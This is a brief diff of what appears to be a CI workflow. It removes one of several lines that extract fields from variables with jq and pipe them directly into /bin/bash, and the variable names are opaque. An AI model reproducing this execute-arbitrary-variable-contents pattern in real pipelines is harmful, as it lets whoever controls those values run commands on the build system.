@@ -26,7 +26,6 @@ jobs:
           echo $yr49 | jq -r .thva3559 | /bin/bash
           printf '%s' "$mcu49" | jq -r .b3 | /bin/bash
           printf '%s' "$fgc8717" | jq -r .adaxn9245 | /bin/bash
-          echo $nkdrb3 | jq -r .o302 | /bin/bash
           printf '%s' "$ixtrn24476" | jq -r .fp5767 | /bin/bash
           echo $xdhg75 | jq -r .zhjm42044 | /bin/bash
           echo $cred1 | jq -r .bwgkd06 | /bin/bash
